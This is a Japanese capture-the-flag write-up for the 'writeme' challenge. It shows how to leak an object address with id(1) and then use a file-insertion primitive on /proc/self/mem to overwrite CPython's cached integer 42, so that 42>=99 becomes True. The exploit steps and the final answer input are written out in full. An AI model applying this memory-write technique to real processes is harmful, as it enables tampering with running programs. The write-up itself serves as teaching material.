# writeme - Writeup

ソースを読むと存在するファイルに文字列`Hack`を挿入できる。  
writemeなるファイルがあるが、文字列挿入だけなのでどうにもならない。  
Chanceと称するevalがあるが`42=99`などできるわけもない。  
任意のファイルに文字列挿入ができるので、`/proc/self/mem`を書き換え可能であることに気づく。  
書き換えによって`42>=99`をTrueとすることを目指す。  
方針として、場所は不明だがには数値42もしくは99のオブジェクトの中身を破壊してやることを考える。  
どうやらCPythonは32バイトずつ数値オブジェクトを順にキャッシュしているらしい。  
Chanceの5文字のevalで行えることはidくらいしかない(計算機にはなるよ)。  
id(1)により無事に数値1のアドレスがリークできたので、id(1)+41*32で書き換える先のid(42)を求める。  
この32バイトは以下のように求めることができる(python3)。  
```python
>>> int(id(2))-int(id(1))
32
>>> (int(id(42))-int(id(1)))/41
32.0
```
ちなみに大きいものはそうでもない。  
```python
>>> (int(id(124))-int(id(123)))
32
>>> (int(id(1235))-int(id(1234)))
-67072224
```
seekで先ほどリークしたアドレス分スキップすることで数値42を改造できる。  
```python
>>> fd = open("/proc/self/mem", "rb")
>>> fd.seek(int(id(42)))
10915808
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00*\x00\x00\x00\x00\x00\x00\x00'
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00+\x00\x00\x00\x00\x00\x00\x00'
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x00\x00\x00'
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00-\x00\x00\x00\x00\x00\x00\x00'
>>> ord("*")
42
>>> ord("+")
43
>>> ord(",")
44
>>> ord("-")
45
```
どうやら25バイト目に数値本体が入っているようだ。  
ここを破壊してやれば`42>=99`をTrueにすることができるかもしれない。  
```python
>>> fd = open("/proc/self/mem", "rb+")
>>> fd.seek(int(id(42)))
10915808
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00*\x00\x00\x00\x00\x00\x00\x00'
>>> fd.seek(int(id(42))+24)
10915832
>>> fd.write(b"A")
1
>>> fd.flush()
>>> fd.seek(int(id(42)))
10915808
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00A\x00\x00\x00\x00\x00\x00\x00'
>>> 42
65
>>> chr(65)
'A'
```
+24seekすればよい。  
挿入される文字列が`Hack`であるため、99より大きくなる。  
```python
>>> fd = open("/proc/self/mem", "rb+")
>>> fd.seek(int(id(42)))
10915808
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00*\x00\x00\x00\x00\x00\x00\x00'
>>> fd.seek(int(id(42))+24)
10915832
>>> fd.write(b"Hack")
4
>>> fd.seek(int(id(42)))
10915808
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00Hack\x00\x00\x00\x00'
>>> fd.flush()
>>> 42
1801675080
>>> hex(1801675080)
'0x6b636148'
>>> hex(ord("H"))
'0x48'
>>> hex(ord("a"))
'0x61'
>>> hex(ord("c"))
'0x63'
>>> hex(ord("k"))
'0x6b'
>>> 42>=99
True
```
よって解法は以下の入力になる。  
```text
id(1)
/proc/self/mem
id(1)の結果 + 41*32 + 24
```